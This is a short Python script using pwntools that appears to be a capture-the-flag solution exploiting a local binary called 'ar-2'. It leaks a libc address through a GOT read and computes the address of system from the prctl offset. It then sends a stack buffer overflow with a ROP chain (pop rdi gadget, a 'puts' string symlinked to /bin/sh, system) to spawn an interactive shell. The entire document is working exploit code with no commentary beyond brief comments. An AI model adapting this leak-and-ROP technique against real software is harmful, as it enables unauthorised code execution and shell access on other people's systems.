from pwn import *

GARB = 'bbbbbbbb'

env = {'PATH' : '.:/bin:/usr/bin'}

# Requires symlink from puts to /bin/sh

system_init_addr = ELF('/lib/x86_64-linux-gnu/libc.so.6').symbols['system']
prctl_init_addr = ELF('/lib/x86_64-linux-gnu/libc.so.6').symbols['prctl']
offset = system_init_addr - prctl_init_addr

# Addresses needed for the attack
pop_rdi_ret_addr = 0x400a33 # From ROPgadget --binary ./rop-leak-got-64
got_addr = 0x601040 # Address of the got entry
puts_string_addr = 0x400453

if os.path.exists("puts"):
    os.remove("puts")
os.symlink("//bin/sh", "puts")

# Launch processs
p = process('./ar-2', env=env)

# Read 8 bytes
print(p.recvline())
print(p.recvline())
p.sendline('8')

print(p.recvline())
p.sendline(hex(got_addr))
print(p.recvline())

prctl_addr = p.recv(8)
print(repr(prctl_addr))

prctl_addr = u64(prctl_addr)
print(hex(prctl_addr))

system_addr = prctl_addr + offset
print(hex(system_addr))

print(p.recvuntil('name:'))
inp = ('a' * 0x80) + GARB + p64(pop_rdi_ret_addr) + p64(puts_string_addr) + p64(system_addr)
p.sendline(inp)
p.interactive()
